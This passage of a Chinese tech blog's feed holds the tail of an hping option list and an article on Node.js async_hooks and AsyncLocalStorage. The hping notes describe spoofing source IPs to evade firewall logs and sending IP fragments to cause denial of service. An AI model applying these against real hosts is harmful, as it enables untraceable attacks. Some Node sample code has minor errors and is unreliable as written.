ack=<span class="number">1380893504</span> sum=<span class="number">2010</span> urp=<span class="number">0</span></span><br><span class="line">-D <span class="attr">--debug</span> 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）</span><br><span class="line">-z <span class="attr">--bind</span> 快捷键的使用。</span><br><span class="line">-Z <span class="attr">--unbind</span> 消除快捷键。</span><br><span class="line">-O <span class="attr">--rawip</span> RAWIP模式，在此模式下HPING会发送带数据的IP头。</span><br><span class="line">-<span class="number">1</span> <span class="attr">--icmp</span> ICMP模式，此模式下HPING会发送IGMP应答报，你可以用<span class="attr">--ICMPTYPE</span> <span class="attr">--ICMPCODE</span>选项发送其他类型/模式的ICMP报文。</span><br><span class="line">-<span class="number">2</span> <span class="attr">--udp</span> UDP 模式，缺省下，HPING会发送UDP报文到主机的<span class="number">0</span>端口，你可以用<span class="attr">--baseport</span> <span class="attr">--destport</span> <span class="attr">--keep</span>选项指定其模式。</span><br><span class="line">-<span class="number">9</span> <span class="attr">--listen</span> signatuer hping的listen模式，用此模式，HPING会接收指定的数据。</span><br><span class="line">-<span class="selector-tag">a</span> <span class="attr">--spoof</span> hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span><br><span class="line">-t <span class="attr">--ttl</span> <span class="selector-tag">time</span> to live 可以指定发出包的TTL值。</span><br><span class="line">-H <span class="attr">--ipproto</span> 在RAW IP模式里选择IP协议。</span><br><span class="line">-w <span class="attr">--WINID</span> UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span><br><span class="line">-r <span class="attr">--rel</span> 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span><br><span class="line">-F <span class="attr">--FRAG</span> 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是<span class="number">16</span>字节。</span><br><span class="line">-x <span class="attr">--morefrag</span> 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span><br><span class="line">-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span><br><span class="line">-G <span class="attr">--fragoff</span> fragment offset value set the fragment offset</span><br><span class="line">-m <span class="attr">--mtu</span> mtu value 用此项后ID数值变得很大，<span class="number">50000</span>没指定此项时<span class="number">3000</span>-<span class="number">20000</span>左右。</span><br><span class="line">-G <span class="attr">--rroute</span> 记录路由，可以看到详悉的数据等等，最多可以经过<span class="number">9</span>个路由，即使主机屏蔽了ICMP报文。</span><br><span class="line">-C <span class="attr">--ICMPTYPE</span> type 指定ICMP类型，缺省是ICMP echo REQUEST。</span><br><span class="line">-K <span class="attr">--ICMPCODE</span> CODE 指定ICMP代号，缺省<span class="number">0</span>。</span><br><span class="line"><span class="attr">--icmp-ipver</span> 把IP版本也插入IP头。</span><br><span class="line"><span class="attr">--icmp-iphlen</span> 设置IP头的长度，缺省为<span class="number">5</span>（<span class="number">32</span>字节）。</span><br><span class="line"><span class="attr">--icmp-iplen</span> 设置IP包长度。</span><br><span class="line"><span class="attr">--icmp-ipid</span> 设置ICMP报文IP头的ID，缺省是RANDOM。</span><br><span class="line"><span class="attr">--icmp-ipproto</span> 设置协议的，缺省是TCP。</span><br><span class="line">-icmp-cksum 设置校验和。</span><br><span class="line">-icmp-ts alias <span class="keyword">for</span> <span class="attr">--icmptype</span> <span class="number">13</span> (to send ICMP timestamp requests)</span><br><span class="line"><span class="attr">--icmp-addr</span> Alias <span class="keyword">for</span> <span class="attr">--icmptype</span> <span class="number">17</span> (to send ICMP <span class="selector-tag">address</span> <span class="attribute">mask</span> requests)</span><br><span class="line">-s <span class="attr">--baseport</span> source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加<span class="number">1</span>，这规则你可以自己定义。</span><br><span class="line">-<span class="selector-tag">p</span> <span class="attr">--deskport</span> <span class="selector-attr">[+]</span><span class="selector-attr">[+]</span>desk port 设置目标端口，缺省为<span class="number">0</span>，一个加号设置为:每发送一个请求包到达后，端口加<span class="number">1</span>，两个加号为：每发一个包，端口数加<span class="number">1</span>。</span><br><span class="line"><span class="attr">--keep</span> 上面说过了。</span><br><span class="line">-w <span class="attr">--win</span> 发的大小和windows一样大，<span class="number">64</span>BYTE。</span><br><span class="line">-O <span class="attr">--tcpoff</span> Set fake tcp data offset. Normal data offset is tcphdrlen / <span class="number">4</span>.</span><br><span class="line">-m <span class="attr">--tcpseq</span> 设置TCP序列数。</span><br><span class="line">-l <span class="attr">--tcpck</span> 设置TCP ack。</span><br><span class="line">-Q <span class="attr">--seqnum</span> 搜集序列号的，这对于你分析TCP序列号有很大作用。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">实用的渗透工具</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="渗透" scheme="https://www.scery.com/categories/Linux/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="渗透" scheme="https://www.scery.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs异步延续模型</title>
    <link href="https://www.scery.com/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm"/>
    <id>https://www.scery.com/Node-js%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B.htm</id>
    <published>2020-09-25T00:16:25.000Z</published>
    <updated>2024-03-18T02:51:00.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node-js异步延续模型"><a href="#Node-js异步延续模型" class="headerlink" title="Node.js异步延续模型"></a>Node.js异步延续模型</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="attr">node</span>:<span class="number">12345</span>] <span class="title class_">Uncaught</span> <span class="title class_">Exception</span>: <span class="title class_">Error</span>: read <span class="variable constant_">ECONNRESET</span></span><br><span class="line">   at <span class="title class_">TLSWrap</span>.<span class="property">onStreamRead</span> (internal/stream_base_commons.<span class="property">js</span>:<span class="number">111</span>:<span class="number">27</span>)</span><br><span class="line">   <span class="comment">// 真的没了</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/641.png" alt="641"></p><h2 id="异步延续模型"><a href="#异步延续模型" class="headerlink" title="异步延续模型"></a>异步延续模型</h2><p>Node.js 使用的 JavaScript 单线程执行模型简化了非常多的问题。而为了防止 IO 阻塞 JavaScript 执行线程，IO 操作在关联了 JavaScript 回调函数后就被放入了后台处理。当 IO 操作完成后，与其关联的 JavaScript 回调会被放入事件队列等待在 JavaScript 线程调用，可以在这里[链接1]了解更多 Node.js 事件循环的详情。</p><p>这个模型有很多好处，但是也有一个关键的挑战：异步资源与操作的上下文管理。什么是异步操作上下文？异步操作的上下文就是给定一个异步操作，我们能够通过异步上下文知道这个异步操作是因为什么触发执行的，接下来可以触发其他什么异步操作。Semantics of Asynchronous JavaScript [链接2] 通过非常精确的描述方法描述了异步资源的“上下文”，但是我们只想回答一个问题，在程序的任意一个执行时间点，“我们是通过什么样的异步函数执行路径执行到现在这个代码位置的”？</p><p>为了回答这个问题，我们先明确几个关键点：</p><ul><li>执行桢 (Execution Frame) - 执行桢是程序中后继函数的一次执行过程。可以把执行桢当作从一个特定的函数执行桢被推入执行栈开始，直到这个执行桢执行结束被弹出调用栈，这样一段时间片段。不是所有的函数都是后继函数 (Continuation)，一个特定的后继函数可以被调用多次，每一次执行都对应一个独立的执行桢。</li><li>后继函数 (Continuation) - 后继函数是在执行桢中创建的 JavaScript 函数，并且会在后续被作为异步回调执行。当被调用时，后继函数会创建一个独立的执行桢。比如当我们调用 <code>setTimeout(function c() &#123;&#125;, 1000)</code>，<code>setTimeout</code> 是在一个执行桢里被调用的，并且以一个后继函数 <code>c</code> 作为参数。当 <code>c</code> 在计时到时后被执行时，会创建一个新的执行桢；当 <code>c</code> 执行结束时，即意味着这个新创建的执行桢执行结束。</li><li>后继点 (Continuration Point) - 后继点是接受一个后继函数作为参数的函数。通常在 JavaScript 中后继点都是宿主环境定义的（ECMAScript 规范中中不存在与 IO 相关的操作的定义）。比如 <code>setTimeout</code>，也包括 <code>Promise.then</code>。值得注意的是，不是所有接收函数作为参数的函数都是后继点，作为后继点，这些函数参数需要被异步调用，即不在当前执行桢被调用执行。比如 <code>Array.prototype.forEach</code> 就不算后继点。</li><li>链接点 (Link Point) - 程序运行中，当一个后继点被调用时，我们称为链接点。这个时候需要在当前执行桢与被作为参数传入的后继函数之间创建一个逻辑连接，作为上下文绑定。</li><li>就绪点 (Ready Point) - 就绪点是程序运行中之前链接过的后继函数被标记为“准备就绪”，准备被执行。这个过程会在后继函数与当前执行桢之间建立逻辑连接，这个逻辑连接可以称为因果关系。通常就绪点都需要在链接点后才能产生，但是 Promise 在这里的处理不太一样，promise 可以在他的 Promise 链中的前置的 promise 被 resolve 时产生一个就绪点，而此时不一定需要已经生成链接点（绑定回调函数），如 <code>new Promise(res =&gt; res())</code> 立刻创建了一个已经 resolve 的 Promise，此时已经触发了就绪点，但是我们还未通过 <code>.then</code> 链接上下一个 Promise。</li></ul><p>而上述几个关键点可以总结为以下几个事件：</p><ul><li>执行开始 (<code>executionBegin</code>): 表示一个执行桢开始执行；</li><li>链接 (<code>link</code>): 表示一个后继点被调用，一个后继函数被放入等待队列等待就绪；</li><li>就绪 (<code>ready</code>): 表示一个就绪点被触发；</li><li>执行结束 (<code>executionEnd</code>): 表示一个执行桢执行完毕。</li></ul><p>这里我们以下面这段代码举个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;starting&#x27;</span>);</span><br><span class="line"><span class="title class_">Promise</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">reject, resolve</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;resolving promise&#x27;</span>);</span><br><span class="line">   <span class="title function_">resolve</span>();</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in then&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码可以通过以下的事件流描述整个异步执行过程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序开始执行</span></span><br><span class="line"><span class="comment">// starting</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>&#125; <span class="comment">// `f1()` 已经被链接到了 &quot;setTimeout()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;link&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>&#125; <span class="comment">// `f2()` 已经被链接到了 &quot;p.then()&quot; 的调用上</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span> &#125; <span class="comment">// 程序外层代码执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">0</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">1</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// 100ms 计时到时，执行就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">3</span> &#125; <span class="comment">// f1() 回调开始执行</span></span><br><span class="line"><span class="comment">// resolving promise</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span>, <span class="string">&quot;linkID&quot;</span>: <span class="number">2</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// promise p 被 resolve，标记了 &quot;then(function f2()...&quot; 就绪</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">4</span> &#125; <span class="comment">// f1() 回调执行完毕</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionBegin&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span>, <span class="string">&quot;readyID&quot;</span>: <span class="number">5</span> &#125; <span class="comment">// f2() 回调开始执行</span></span><br><span class="line"><span class="comment">// in then</span></span><br><span class="line">&#123; <span class="string">&quot;event&quot;</span>: <span class="string">&quot;executionEnd&quot;</span>, <span class="string">&quot;executeID&quot;</span>: <span class="number">6</span> &#125; <span class="comment">// f2() 回调执行完毕</span></span><br></pre></td></tr></table></figure><p>现有技术</p><h3 id="async-hooks"><a href="#async-hooks" class="headerlink" title="async_hooks"></a><code>async_hooks</code></h3><p><code>async_hooks</code> 即是 Node.js 对上述模型的实现。其中 <code>async_hooks</code> API 提供了几个异步阶段的钩子回调可以注册：</p><ul><li><code>[init(asyncId, type, triggerAsyncId, resource): void](https://nodejs.org/api/async_hooks.html#async_hooks_init_asyncid_type_triggerasyncid_resource)</code> - 表示 asyncId 对应的异步资源（可以理解为上文中的异步上下文）初始化完成，后续这个资源可以触发异步回调（不绝对会触发，比如一个 HTTP Server 启动后没人来请求）；</li><li><code>[before(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_before_asyncid)</code> - 表示准备开始执行异步回调函数，而在这个异步回调函数的执行桢中，生成的任意异步资源（相当于上文中的后继函数）都会与 asyncId 参数对应的异步资源链接，作为触发原因；</li><li><code>[after(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_after_asyncid)</code> - 表示异步回调函数执行完毕，停止将asyncId 参数关联的异步资源与当前执行桢新创建的异步资源链接；</li><li><code>[destroy(asyncId): void](https://nodejs.org/api/async_hooks.html#async_hooks_destroy_asyncid)</code> - 表示 asyncId 参数对应的 异步资源被回收，后续不可能再通过这个异步资源触发回调。</li></ul><h3 id="与-domain-的区别"><a href="#与-domain-的区别" class="headerlink" title="与 domain 的区别"></a>与 <code>domain</code> 的区别</h3><p>部分了解、使用过 <code>domain</code> 模块的同学可能会有一个疑问，<code>async_hooks</code> API 与被废弃的 <code>domain</code> 有什么区别？</p><p><code>async_hooks</code> 作为上述异步模型中将各个异步资源链接起来的黏合剂，其本身并不提供任何错误处理相关的 API，他的 API 语义也非常清晰，只是对于异步资源的执行事件的描述。而 <code>domain</code> 的主要用途是异步错误的处理，但是因为在 <code>domain</code> 提出的时候还不存在 <code>async_hooks</code>，并且对于异步资源、异步执行的语义定义并不清晰，从而导致实际生产中 <code>domain</code> 的使用非常容易导致错误并且难以排查（多个 <code>domain</code> 的使用方其中如果使用了不是那么正确的方法，会将 <code>domain</code> 的状态搅得一团糟）。</p><p>而在 <code>async_hooks</code> 实现了明确的异步资源与执行的语义后，<code>domain</code> 的实现也进行了迁移、使用 <code>async_hooks</code> 来实现对于异步资源回调的追踪（实现详情可以了解 PR[链接3]）。</p><h3 id="Node-js-Add-on-的兼容性"><a href="#Node-js-Add-on-的兼容性" class="headerlink" title="Node.js Add-on 的兼容性"></a>Node.js Add-on 的兼容性</h3><p>虽然 Node.js 提供的 IO 操作的异步回调都已经被妥善地封装了异步调用的上下文切换，但是 Node.js 还提供了 C/C++ Add-on 的 API，这些 Add-on 普通的 <code>napi_call_function</code> 调用并不会被当成是一个新的执行桢，就如同一个 JavaScript 函数中调用另一个 JavaScript 函数。但是如果 Add-on 在异步回调中也简单地使用 <code>napi_call_function</code> 就有可能导致 async_hooks 所提供的异步资源 API 出现漏洞。所以 Add-on 需要按照 async_hooks 提供的钩子的语义，在各个关键时间点通过异步资源 API 注册上，即可完善整个异步调用链路。但是这样会给 Add-on 开发过程造成了一定的负担，而为了降低 Add-on 开发过程出现纰漏的可能。N-API 提供了线程安全的回调 JavaScript 线程的 <code>napi_threadsafe_function</code> 机制，并且已经与异步资源绑定，不需要我们再关心异步资源的事件管理。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#include &lt;assert.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;node_api.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">async_call_js</span>(<span class="params">napi_env env,</span></span><br><span class="line"><span class="params">                  napi_value js_callback,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* context,</span></span><br><span class="line"><span class="params">                  <span class="keyword">void</span>* data</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 将 data 转换成 JavaScript 值</span></span><br><span class="line"> napi_value value = <span class="title function_">transform</span>(env, data);</span><br><span class="line"> napi_value recv;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;recv);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="comment">// N-API 已经为我们绑定了异步资源，这里可以安全地使用 `napi_call_function`</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_call_function</span>(env, recv, js_callback, <span class="number">1</span>, &amp;value, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会在工作线程被调用的工作函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">do_work</span>(<span class="params">napi_threadsafe_function tsfn</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/** work, work. */</span></span><br><span class="line"> napi_status status = <span class="title function_">napi_call_threadsafe_function</span>(tsfn, data, napi_tsfn_nonblocking);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">napi_value <span class="title function_">some_module_method</span>(<span class="params">napi_env env, napi_callback_info info</span>)</span><br><span class="line">&#123;</span><br><span class="line"> napi_status status;</span><br><span class="line"> <span class="comment">// 创建与 AsyncResource 绑定的 ThreadSafe Function</span></span><br><span class="line"> napi_threadsafe_function tsfn;</span><br><span class="line"> status = <span class="title function_">napi_create_threadsafe_function</span>(env,</span><br><span class="line">                                          func,</span><br><span class="line">                                          async_resource,</span><br><span class="line">                                          async_resource_name,</span><br><span class="line">                                          max_queue_size,</span><br><span class="line">                                          initial_thread_count,</span><br><span class="line">                                          finalize_data,</span><br><span class="line">                                          finalize_cb,</span><br><span class="line">                                          context,</span><br><span class="line">                                          call_js_cb,</span><br><span class="line">                                          &amp;tsfn);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 创建工作线程</span></span><br><span class="line"> <span class="title function_">create_worker</span>(tsfn, <span class="comment">/** 其他参数 */</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回 JavaScript 值..</span></span><br><span class="line"> napi_value ret;</span><br><span class="line"> status = <span class="title function_">napi_get_null</span>(env, &amp;ret);</span><br><span class="line"> <span class="title function_">assert</span>(status == napi_ok);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="异步任务调度"><a href="#异步任务调度" class="headerlink" title="异步任务调度"></a>异步任务调度</h3><p>在单元测试中，如果我们使用了异步任务，一个可能比较常见的场景就是这个异步任务可能会泄漏出我们的测试函数执行桢导致我们后续无法追踪、或者影响了后续的测试结果。</p><p>我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;should wait for async test&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">0</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">// only after this code executes will the test complete.</span></span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;wait for me&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们可以看到其中 setTimeout 逃逸出了测试执行桢，从而导致测试提早结束，并且可能影响后续测试任务的运行（比如在 setTimeout 中抛出了异常）。现在我们可以通过将全部的方法都使用 callback、promise 给串起来，但是这毕竟需要开发者自行去完成，并且可能出现疏漏，还是会出现例子中的情况。那么我们有没有可能从语言运行时层面提供一个“完美”的方案来跟踪所有的异步任务呢？通过 <code>async_hooks</code> 的异步资源追踪能力，我们就可以标记所有在测试执行过程中创建的异步资源，如果在测试执行结束后，还存在未销毁的异步资源，就可以更早地将问题暴露。</p><p>如我们有下面这个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;createHook, <span class="title class_">AsyncLocalStorage</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;async_hooks&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> als = <span class="keyword">new</span> <span class="title class_">AsyncLocalStorage</span>();</span><br><span class="line"><span class="keyword">const</span> backlog = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="title function_">createHook</span>(&#123;</span><br><span class="line"> init (asyncId, type, triggerAsyncId, resource) &#123;</span><br><span class="line">   <span class="keyword">const</span> test = als.<span class="title function_">getStore</span>();</span><br><span class="line">   <span class="keyword">if</span> (test == <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   backlog.<span class="title function_">set</span>(asyncId, &#123; type, triggerAsyncId, resource &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"> destroy (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;,</span><br><span class="line"> promiseResolve (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">enable</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queue = []</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">name, callback</span>) &#123;</span><br><span class="line"> queue.<span class="title function_">push</span>(&#123; name, callback &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="keyword">if</span> (queue.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">const</span> &#123; name, callback &#125; = queue.<span class="title function_">pop</span>();</span><br><span class="line"> als.<span class="title function_">run</span>(name, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">await</span> <span class="title function_">callback</span>();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">     als.<span class="title function_">exit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="title function_">setImmediate</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">         <span class="title function_">assert</span>(backlog.<span class="property">size</span> === <span class="number">0</span>, <span class="string">`&#x27;<span class="subst">$&#123;name&#125;</span>&#x27; ended with dangling async tasks.`</span>);</span><br><span class="line">         <span class="title function_">run</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="title function_">nextTick</span>(run);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 测试声明开始 */</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>));</span><br><span class="line"> <span class="comment">// Pass.</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;bar&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>);</span><br><span class="line"> <span class="comment">// Assert Failed =&gt; &#x27;bar&#x27; ended with dangling async tasks.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，每一次测试开始执行前，我们都会在为测试运行注册一个异步特有数据存储，然后再开始执行测试，这样在测试中发起的所有异步资源都会被 <code>async_hooks</code> 捕捉到并被测试模块标记，直到这个异步资源被销毁（或者是 Promise Resolve）。随后在测试结束后，我们再检查当前测试是否有遗留的异步资源，即可确认我们的测试是干净无残留的。</p><h3 id="异步调用栈-性能诊断"><a href="#异步调用栈-性能诊断" class="headerlink" title="异步调用栈/性能诊断"></a>异步调用栈/性能诊断</h3><p>这也是我们开头的问题。</p><p>在越来越多大型的项目使用 Node.js 作为研发技术栈后，开发者们也会越来越关注问题的诊断便捷性。除了异常错误排查，现在我们也可以通过 Chrome DevTools 的 CPU Profiler 亦或者是生成火焰图来诊断我们的 Node.js 应用性能表现，但是这些工具现在更多的是只能查看某一个函数在单个同步执行桢中的调用链路与时间占用比例，并没有能力将一个异步链路上每一个异步操作所花费的时间与百分比描绘出来。</p><p>而在能够串联异步链路中的异步调用栈之后，后续我们也可以在开发中使用更加直观的性能剖析工具：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640.jpg" alt="640"></p><p>或者是提供线上的请求链路追踪能力，就如同现在各种成熟 APM 提供的应用间 RPC 调用链路一样，我们同样也可以绘制出应用内一个请求到底经历了什么流程，每一步分别花费了多少时间：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640-20200925131314743.jpg" alt="640-20200925131314743"></p><h3 id="AsyncLocalStorage"><a href="#AsyncLocalStorage" class="headerlink" title="AsyncLocalStorage"></a>AsyncLocalStorage</h3><p>使用线程作为处理单元的模型中，我们可以使用 ThreadLocal 来存储对于当前线程特有的数据信息，那么在 Node.js 的异步模型中，我们有什么办法可以方便地存储对于当前异步任务来说特有的数据信息呢？</p><p>Node.js 在 3 月 4 日发行的 v13.10.0 版本第一次发布了 <code>async_hooks.AsyncLocalStorage</code>，可以在异步回调或者 <code>Promise</code> 中获取异步调用的状态信息，比如 HTTP 服务器在处理请求的异步链路中的任意一步都可以访问对于这个请求而言专有的数据。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>除了在 Node.js 中我们需要清晰的异步执行模型的定义之外，同样提供了 JavaScript 执行环境的浏览器中在 JavaScript 项目日渐复杂之后同样也需要更能描写异步时间线的诊断能力。除此之外，其实 Node.js 的 <code>async_hooks</code> 接口本身并不容易被更多的用户所使用，他暴露了异步资源非常底层的属性，虽然这些接口能够准确描述我们的异步资源，但是想要利用好这些接口并不简单。</p>]]></content>
    
    
    <summary type="html">异步执行在 Node.js 中是非常基本的操作，但是一个 `Uncaught Exception` 的报错就可能让我们摸不着头脑，是什么地址的 TLS 访问 `ECONNRESET` 了？</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/categories/Linux/Nodejs/"/>
    
    <category term="异步延续模型" scheme="https://www.scery.com/categories/Linux/Nodejs/%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/tags/Nodejs/"/>
    
    <category term="异步延续模型" scheme="https://www.scery.com/tags/%E5%BC%82%E6%AD%A5%E5%BB%B6%E7%BB%AD%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs异常处理方式</title>
    <link href="https://www.scery.com/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm"/>
